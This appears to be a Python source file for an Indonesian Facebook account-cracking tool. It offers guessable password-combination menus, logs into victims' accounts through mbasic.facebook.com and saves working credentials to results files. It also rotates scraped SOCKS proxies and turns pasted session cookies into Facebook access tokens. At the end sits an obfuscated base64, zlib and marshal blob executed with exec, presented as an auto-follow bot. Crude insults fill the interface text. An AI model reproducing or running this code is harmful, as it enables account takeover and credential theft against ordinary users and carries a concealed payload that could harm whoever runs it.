			"https://m.facebook.com/v3.3/dialog/oauth?encrypted_query_string=AeDT2UXYR_53fiXztzu_JhFEBFfSJQgdUJGUXpWNi06kMvyZabZnxfdBZhZqn0UVav0tMQhs1d-jJsCtyUwNApPh-rjYgugWqF-e66qARB91xP624bvOxSjswdmzxS1zgvH4Ojj2MOEEW-Qi3bMycxfp8etyXlIdau3ppuAyyDbEBSIyiWvpC8Fl0k72v7CPgmvEGr6EvqJJ3P96Cmtf4nAFS8qWpLS3hwVpvr-cYADOlLya0mpQybTQ47egOAscvQV6EJZGU0gf4ptTfXhpcIb_ZLZh0gOKDftQzztpwa5jzDXQyiMFC94hijWNafrhSEZ8WtfinBYZkUVU4hbjM6CDzdO14HDUlHa-_QU3aQQo-V1wpnndx0cE1pNbOSuLpyW0E6q5MJ8qRZ7J2uX4PcmjsOBHRfOWA1hsBPQrHPnWoVidw8Lk67C4b9ult5CY578K5fHL447X3Wjq3jXxdSCEPNL-MLpW0bsjPM3-cNC1X9oYB6AjxpToI6zqS5ML-eRsA5VVeB89eS2X4xxcgveP2oOnFWUMyqQS7Ma1guZvlRvCc9rK7elLXdljMd743YV6RJLg7l_wGelvrdbGJAClrZQN2NPuvxLfUyOwIblHTTZ21mA8diwCfRFkmwbbg30y9ry6wN39pTXZdZlGEuoQezQO1qgJD845j2oGD057s9p3S-p10ljHw-eYOvx8u6gMFdWPmbmKIF6KKkJhdzwGh1JDoWRjmxvcXiZal1VM4S8ZE99uIM54eNlpB0wxcVVJZ92j72g4mc_75e1fEfhQw1ZSPlrfq4Auc3bYQFMZ7x87n8_Buv_V-33jSjl0XyXNUk9UQlRVLztDgihIRspczT94fGzhzksV0ASf0a9pyaYTrbsHjK_o7tGxLtCqneuiooMwvds0VB9BgpwlwhVMmotgV881fyZ-9Ge_CAYXenAoGUJMufxZ-P5FGIpWRy5XmJ6ZiE9KsnV2m2W11ZUDYozAHF_aiVjT3AxhN9tAyKv4shU0ChnURwPQOdT-N4_Bqwzu1kCIanP4rIYhzF8XsFjVt0ygH7Xv9kDDI2xifFdhmfNEEG0s91VRP0_3cLzIXEY0MLgpyvQ4qI6_KMGCTKnCUBsAnxhy9Dzj3pAJ5XcWVxp6UFihIk1czVytY_bQ_oBu4eHzWp8kXQeO_W34TJPJKrzvnyNDMpKKUKaaOl3kNPLvggYm5I5vb7kOk-KnIQgWy5vS2-M9MIOEQLiQBa58eig2tfBP9bVDRQ6xzeNghsXBO_HsX4UwLqdfLz0EbpplEIELjKRpzgDnr7hYN1sM4wvVmHMr98VROyWrNxc7Wy1FjxKeSl__wVLXxeIVg8SPa9kBr_hKJ6-3rQQUdHr6N7TqgXceyF9CTa1JDC9gKrN7oVCR9XfnN6hKmWA4T9mFOO5Dd5UYRAp6FlpjnHyv5dtsvRWfcA7RFC9nUTAXhGwODXxBNpY8BGc7Xh8vTDwTKqmsyUQN5V1czX8bxLhsWVLODZhaI37hREsTOLT5nHOrg0NYNcc-s80UANkPOpcpu_yQDko1fBGR3-ARPgRiLT4GX59glmvFSIIoVb9LnXT8-tRDBA",
			"https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=216570901687097&cbt=1660268970371&e2e=%7B%22init%22%3A1660268970371%7D&ies=0&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=30032935-4997-43a5-abac-0d2c6cae81d5&scope=user_birthday%2Cuser_likes%2Copenid%2Cuser_link%2Cuser_gender%2Cemail&state=%7B%220_auth_logger_id%22%3A%2226cb2987-4616-4361-90ff-ab55b956e68f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%225le280ansood69lmdd9e%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.ru.yandex.searchplugin&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true"]
		else:
			kotak("# KONCOL TINGGAL PILIH 1-5 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_next()



	def pilih_fps(self):
		global fps
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"B-API\n{UU}MOBILE{QQ}/{KK}MBASIC{QQ}/{MM}FREE{QQ}/{II}P{QQ}/{KK}X{QQ}")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-2{q}--> ')
		if hu in ['1','01']:
			fps = "fast"
		elif hu in ['2','02']:
			fps = "kontol"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-2 ITU AJA SUSAH, AnJIM",C,Q)
			time.sleep(2)
			self.pilih_fps()


	def tanya_prox_k(self):
		global prox_k
		iprint(Panel(f'{CC}Apakah Anda Ingin Menggunkan Proxy{QQ}'))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			opsi_y = "Risky_Ganteng"
		elif kp in ["n","N"]:
			opsi_y = "PEPEK"

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_prox_k()


	def tanya_opsi(self):
		global opsi_y
		iprint(Panel(f'{CC}Apakah Anda Ingin Menampilkan Opsi Sesi Akun{QQ}'))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			opsi_y = "IYA"
		elif kp in ["n","N"]:
			opsi_y = "PEPEK"

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_opsi()
	def tanya_apk(self):
		global apk_me
		iprint(Panel(f"{CC}Apakah Anda Ingin Menampilkan Aplikasi{QQ}({KK}Tidak Recommended{QQ})", style=Q, title="PEPEK ENGGA DIBACA"))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			apk_me = "IYA"
		elif kp in ["n","N"]:
			apk_me = "PEPEK"

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_apk()
	def pas_me(self):
		global pass_
		iprint(Panel(f"{CC}Silahkan Pilih Kombinasi Password Crack{QQ}", style=Q, title="BACA DULU KONTOL"))
		wwe = me()
		wwe.add_column("NO", style=K, justify="center")
		wwe.add_column("PILIHAN", style=C, justify="center", width=60)
		wwe.add_row("1\n2\n3\n4\n5\n6", "name123,name12345\nname,name123,name1234,name12345\nname,name123,name12345,sayang,anjing,kontol\nname,name123,name12345 + 6 Password\nname,name123,name1234,name12345 + MANUAL\nMANUAL")
		sol().print(wwe, justify='center')
		kol = input(f">--Pilih 1-4--> ")
		if kol in [" ",""]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.pas_me()
		elif kol in ["1","01"]:
			pass_ = "1"
		elif kol in ["2","02"]:
			pass_ = "2"
		elif kol in ["3","03"]:
			pass_ = "3"
		elif kol in ["4","04"]:
			pass_ = "4"
		elif kol in ["5","05"]:
			pass_ = "5"
			kotak("# GUNAKAN , (koma) Untuk Pemisah Password Dan Minimal Pass 6 Huruf/Angka",I,M)
			pwx = input(f">--{k}Password{q}--> ")
			if pwx == '':
				kotak("# JANGAN KOSONG, KONTOL BIG",M,Q)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=5:
				kotak("# MINIMAL PASSWORD HARUS LEBIH DARI 5 HURUF/ANGKA",K,Q)
				time.sleep(3),self.pas_me()
			else:
				pass_man=pwx

		elif kol in ["6","06"]:
			pass_ = "6"
			kotak("# GUNAKAN , (koma) Untuk Pemisah Password Dan Minimal Pass 6 Huruf/Angka",I,M)
			pwx = input(f">--{k}Password{q}--> ")
			if pwx == '':
				kotak("# JANGAN KOSONG, KONTOL BIG",M,Q)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=5:
				kotak("# MINIMAL PASSWORD HARUS LEBIH DARI 5 HURUF/ANGKA",K,Q)
				time.sleep(3),self.pas_me()
			else:
				pass_man=pwx

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kol}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.pas_me()

def ubah_cok(cookie):
	try:
		cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	except:
		cok=cookie
	return(str(cok))
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	ok_ = Tree("               ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu green")

	ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
	ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")

	ok___ = ok__.add(f"{b}COOKIES{q}")
	ok___.add(f"{c}{cok}{q}")


	try:
		active = Tree(f"\r{b}Aplikasi Aktif{q}:")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{b}Aplikasi Tidak Aktif{q}:")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	ok__.add(active)
	ok__.add(inactive)

	code="""Wans X Gans
Jeck X Nano
Xenzi Ganz
Radhin Al Haady
Zee K World
Moch Aang Ardiansyah XD.
Risky"""
	pyhon = Syntax(code, "python", theme="monokai", line_numbers=True)
	ok____= ok__.add(f"{b}Thanks To:{q}")
	ok____.add(Group(pyhon))
	prints(ok__)



def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Ditambahkan" in apk.text:
				active.add(f"\r{i}{str(apk.text).replace('Ditambahkan',' Ditambahkan')}{q}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass

def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Kedaluwarsa" in apk.text:
				inactive.add(f"\r{m}{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}{q}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_inactive(next,inactive,cookie)
	except:pass

def ubah_bahasa(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass



def cekfile_crk(folder):
	dirs = os.listdir(folder)
	god_cp,god_ok="",""
	for file in dirs:
		filex = (folder+"/"+file)
		try:
			juma = open(filex,"r").readlines()
			total = ("%s"%(str(len(juma))))
		except:total = (" ?? ")
		try:
			ijo__ = filex.split("results/OK-")[1]
			ijo_ = (QQ+II+"results/OK-"+ijo__)
			god_ok += (ijo_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
		try:
			kuning__ = filex.split("results/CP-")[1]
			kuning_ = (QQ+KK+"results/CP-"+kuning__)
			god_cp += (kuning_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
	iprint(Panel(god_ok, style=I, title="RESULTS OK"))
	iprint(Panel(god_cp, style=K, title="RESULTS CP"))
	print()



def hide_opsi(user,pe,tlt):
	ok_ = Tree("                                 ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman:",guide_style="uu red")
	ok___= ok__.add(f"{b}Id{q} Dan {b}Password{q}")
	ok___.add(f"{o}{user}{q}|{o}{pe}{q}|{q}{tlt}{q}")


	opsi= ok__.add("Option")
	check_op(user,pe,tlt,opsi)


	prints(ok__)
def check_op(userrz,pwz,ttl,opsi):
	try:
		host = "https://mbasic.facebook.com"
		ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
		ses = requests.Session()
		ses.headers.update({
		"Host": "mbasic.facebook.com",
		"cache-control": "max-age=0",
		"upgrade-insecure-requests": "1",
		"origin": host,
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": ua,
		"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"x-requested-with": "mark.via.gp",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "navigate",
		"sec-fetch-user": "?1",
		"sec-fetch-dest": "document",
		"referer": host+"/login/?next&ref=dbl&fl&refid=8",
		"accept-encoding": "gzip, deflate",
		"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
		})
		data = {}
		ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":userrz,"pass":pwz})
		try:
			run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		except requests.exceptions.TooManyRedirects:
			opsi.add(f"{m}Akun Ini Terkenak Spam{q}")
		if "c_user" in ses.cookies:
			opsi.add(f"{u}Akun Ini Tidak CheckPointint😱😱{q}")
			open('results/OK-'+durasi+'.txt','a').write(userrz+"|"+pwz+"\n")
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
			}
			xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			if(str(len(ngew))=="0"):
				opsi.add(f"{u}SELAMAT AKUN INI TAP YES 😎 {q}({b}Login Difb Lite/Mbasic{q})")
				open('results/TAP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
			else:
				jml="%s%s"%(k,str(len(ngew)))
				opsi_ = opsi.add(f"\r{b}Jumlah Opsi {jml} {q}")
				for opt in range(len(ngew)):
					jo = str(opt+1)
					opsi_.add(f"{k}{jo}{q}. {b}{ngew[opt]}{q}")
				open('results/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
		elif "login_error" in str(run):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			opsi.add(f"{k}{oh}{q}")
		else:
			opsi.add(f"\r{m}Password Akun Ini Sudah DiGanti{q}")
	except Exception as c:
		opsi.add(f"{m}Ups.. Sepertinya Akun Ini Tidak Bisa DiCheck!!{q}")
		open('results/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")




def get_proxy_socks5():
	max_proxy = "100000"
	kontol_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	open("data/prox_socks5.txt","w")
	for name_prox in kontol_prox:
		try:
			proxz = requests.get(name_prox).text.strip()
			open("data/prox_socks5.txt","a").write(proxz)
			file = open("data/prox_socks5.txt","r").readlines()
			for crot in file:
				crot = crot.replace("\n","")
				prox_.append(crot)
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
def get_proxy_socks4():
	max_proxy = "100000"
	kontol_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	open("data/prox_socks4.txt","w")
	for name_prox in kontol_prox:
		try:
			proxz = requests.get(name_prox).text.strip()
			open("data/prox_socks4.txt","a").write(proxz)
			file = open("data/prox_socks4.txt","r").readlines()
			for crot in file:
				crot = crot.replace("\n","")
				prox_.append(crot)
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()

def free_cookies():
	ul="https://m.facebook.com/100032386028880/posts/674525870303608/?app=fbl"
	ses = requests.Session()
	url = parser(ses.get("https://mbasic.facebook.com/100032386028880/posts/p/674525870303608").text,"html.parser")
	data = re.findall('"text":"(.*?)"',str(url))
	cokxyz = []
	n = 0
	for cok in data:
		if len(cok)>=20:
			try:
				if cok in cokxyz:pass
				else:
					n +=1
					cokxyz.append(cok)
					print(f"{k}{n}{q}. Cookies : {c}{cok}{q}")
			except:continue
#	ask = input(f"{q}Pilih Cookies : ")
	try:
#		cookie = cokxyz[int(ask)-1]
#		login_cookie(cookie)
		kotak("# SILAHKAN COPY COOKIES SESUAI KEBUTUHAN!!",I,Q)
		login_cok()
	except Exception as e:
		prints(Panel(f"{MM}Maaf Terjadi Kesalahan!!",width=80,style=M))
		os.sys.exit()

def login():
	AL = pilih([II,KK,MM,UU,JJ,OO,QQ])
	logox = f"""{AL}______ _______ ______________________   __\n___  / __  __ \__  ____/____  _/___  | / /\n__  /  _  / / /_  / __   __  /  __   |/ /        {CC}•{MM}MODE IN INDONESIA{CC}•{AL}\n_  /___/ /_/ / / /_/ /  __/ /   _  /|  /\n/_____/\____/  \____/   /___/   /_/ |_/"""
	iprint(Panel(logox, style=Q, title=f"{CC}Login Menggunakan Cookies{QQ}"))
	tod = me()
	tod.add_column("NO", style=I, justify="center")
	tod.add_column("PILIHAN", style=C, justify="center", width=60)
	tod.add_column("STATUS", style=K, justify="center")
	tod.add_row(f"1\n2","Free Cookies\nLogin Cookies",f"{MM}OFF{QQ}\n{II}ONN{QQ}")
	sol().print(tod, justify='center')
	pil=input(f">--Pilih 1-2--> {q}")
	if pil in ("1","01"):
#		free_cookies()
		os.sys.exit("udah dibilang maintenance !")
	elif pil in ("02","2"):
		os.system("clear")
		login_cok();os.sys.exit()
	else:
		kotak("# MAAF PILIHAN YANG ANDA PILIH TIDAK ADA !!",M,Q);time.sleep(3)
		login()

def login_cok():
	AL = pilih([II,KK,MM,UU,JJ,OO,QQ])
	logox = f"""{AL}______ _______ ______________________   __\n___  / __  __ \__  ____/____  _/___  | / /\n__  /  _  / / /_  / __   __  /  __   |/ /        {CC}•{MM}MODE IN INDONESIA{CC}•{AL}\n_  /___/ /_/ / / /_/ /  __/ /   _  /|  /\n/_____/\____/  \____/   /___/   /_/ |_/"""
	iprint(Panel(logox, style=Q, title=f"{CC}Login Menggunakan Cookies{QQ}"))
	kotak("# MASUKAN COOKIES ANDA YANG MASIH FRESH/BARU DIAMBIL", K,Q)
	try:
		cokex = input(f">--{c}COOKIES ANDA{q}--> ")
		kotak("# MOHON BERSABAR SEDANG MENGUBAH COOKIES KETOKEN FACEBOOK",K,Q)
		if cokex in [" ",""]:
			kotak('# Jangan Kosong Ngab...');time.sleep(3)
			login()

		user = cokex.split("c_user=")[1]
		try:
			user = user.split(";")[0]
		except:
			user = ""
		kukis_sus = cokex
		kukis_sus = kukis_sus.replace("noscript=1", "")
		kukis_impos = ""
		kukis_sus = kukis_sus.replace("c_user="+user+";", "")
		kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
		kukis_sus = kukis_sus.replace(";c_user="+user, "")
		kukis_sus = kukis_sus.replace("c_user="+user, "")
		kukis_impos += kukis_sus
		kukis_impos += ";"
		kukis_impos += "c_user="
		kukis_impos += user
		coki = kukis_impos
		_cookie = kukis_impos
		try:
			convert_token(_cookie)
			open_role()
			yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			bot_facebook()
			kotak(f"# Selamat Datang {nama}.... Semoga Token Anda Awet", I, Q)
			iprint(Panel("Berhasil Login Menggunakan Cookies !!!\nSilahkan Ketik : python main.py"))
		except Exception as e:
			print(str(e))
			try:os.system("rm -f data/login.txt")
			except:pass
			try:os.system("rm -f data/cookie.txt")
			except:pass
			kotak(f"# MAAF SEPERTINYA COOKIES ANDA ERROR {str(e)}", M, Q)

		os.sys.exit()
	except Exception as e:
		kotak(f"# ERROR : {e}", M, Q)
		os.sys.exit()
class convert_token:
	def __init__(self, kues):
		global kukis_,kukis
		kukis_ = kues
		kukis = {'cookie':kukis_}
		self.__eaag__()
	def __eaag__(self):
		sus = requests.Session()
		sus_ = sus.get("https://business.facebook.com/business_locations",headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":kukis_})
		hasil_ = (re.findall("(EAAG\w+)", sus_.text))
		if len(hasil_) == 0:
			kotak("# MOHON MAAF, SEPERTINYA COOKIES ANDA TIDAK BISA DIUBAH KETOKEN EAAG",M,Q)
			kotak('# MOHON BERSABAR SEDANG MENGUBAH TOKEN EAAI',I,Q)
			self.__eaai__()
		else:
			for token in hasil_:
				open("data/login.txt", "w").write(token)
			open("data/cookie.txt", "w").write(kukis_)
	def __eaai__(self):
		with requests.Session() as r:
			headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','Cookie':kukis_}
			response = r.get('https://web.facebook.com/ads/manager/account_settings/account_billing/?_rdc=1&_rdr', headers = headers)
			find = re.findall('(EAAI\w+)', response.text)
			if len(find) == 0:
				kotak("# MOHON MAAF, SEPERTINYA COOKIES ANDA TIDAK BISA DIUBAH KETOKEN EAAI",M,Q)
				kotak('# MOHON BERSABAR SEDANG MENGUBAH TOKEN EAAB',I,Q)
				self.__eaab__()
#				os.sys.exit()
			else:
				for token in find:
					open("data/login.txt", "w").write(token)
				open("data/cookie.txt", "w").write(kukis_)
	def __eaab__(self):
		with requests.Session() as r:
			headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36','Cookie': kukis_}
			respon = r.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
			find = re.findall('act=(.*?)&nav_source', respon.text)
			if len(find) == 0:
				kotak("# MOHON MAAF, SEPERTINYA COOKIES ANDA TIDAK BISA DIUBAH KETOKEN EAAB",M,Q)
				os.sys.exit()
			else:
				for y in find:
					response = r.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={y}&nav_source=no_referrer', headers = headers)
					token = re.search('(EAAB\w+)', response.text).group(1)
					open("data/login.txt", "w").write(token)
				open("data/cookie.txt", "w").write(kukis_)
		os.sys.exit()

#Bot Auto Follow (Dilengkapi Anti Rikod)
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=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